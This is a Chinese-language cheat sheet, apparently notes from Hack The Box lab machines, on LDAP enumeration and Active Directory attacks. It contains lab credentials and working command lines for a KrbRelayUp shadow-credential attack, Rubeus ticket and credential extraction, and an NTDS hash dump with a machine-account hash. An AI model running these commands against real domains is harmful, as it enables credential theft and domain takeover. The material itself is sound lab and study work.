轻量目录访问协议，用于访问和修改分布式目录服务，如 Active Directory

##### crackmapexec 
```bash
crackmapexec ldap DOMAIN -u USER -p PASS [-k] [--users]
```

##### nmap 
```bash
nmap -p 389 --script ldap-search 10.10.10.119
```

##### ldapsearch
简单查询
```bash
ldapsearch -x -s base -b "" -H ldap://0.0.0.0 namingContexts 
[-Y GSSAPI   指定Kerberos认证,安装 libsasl2-modules-gssapi-mit 包]
```
例 `ldapsearch -x -s base -b "" -H ldap://10.129.229.57 namingContexts`
`namingContexts` : 查询上下文

**补充: 如果提示找不到 dc 主机，可能是 hosts 文件中的主机排序顺序。把 dc 放在第一位尝试**

查看用户信息,可疑字段
```bash
ldapsearch -H ldap://10.129.226.227 -x -b "DC=cascade,DC=local" '(ObjectClass=User)' | less
```

获得凭据查询
```bash
└─$ ldapsearch -x -b "dc=support,dc=htb" -H ldap://10.129.230.181 -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | less
```

##### ldapdomaindump (ldap 域信息转储)

```bash
ldapdomaindump -u search.htb\\hope.sharp -p 'IsolationIsKey?' 10.129.229.57 -o ./
```


# Attack
**KrbRelay**
https://github.com/cube0x0/KrbRelay
```bash
必须满足： 没有2022年10月补丁 ， 禁用LDAP签名 。
crackmapexec ldap absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' -k -M ldap-checker   (检查ldap签名)
```

发现 OXID 解析器的可用端口
```
*Evil-WinRM* PS C:\programdata> .\CheckPort.exe 
[*] Looking for available ports..
[*] SYSTEM Is allowed through port 10
```

查找版本号
```
*Evil-WinRM* PS C:\programdata> cmd /c ver
Microsoft Windows [Version 10.0.17763.3406]
```
https://www.gaijin.at/en/infos/windows-version-numbers

**RunasCs** 是一个实用程序，用于使用与用户当前登录使用显式凭据提供的权限不同的权限来运行特定进程。该工具是 Windows 内置 runas.exe 的改进开放版本，解决了一些限制
https://github.com/antonioCoco/RunasCs/

从登录类型表里筛查，尝试 NewCredentials ，编号9
https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types
```bash
.\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb 'C:\Users\winrm_user\desktop\KrbRelayUp.exe full -m shadowcred --ForceShadowCred -cls 3c6859ce-230b-48a4-be6c-932c0c202048' -l 9
```

```powershell
./r.exe asktgt /user:DC$ /certificate:<certificate> /password:<passowrd> /getcredentials /show /nowrap
```

crackmapexec 转储 ntds
```powershell
crackmapexec smb absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds
```
















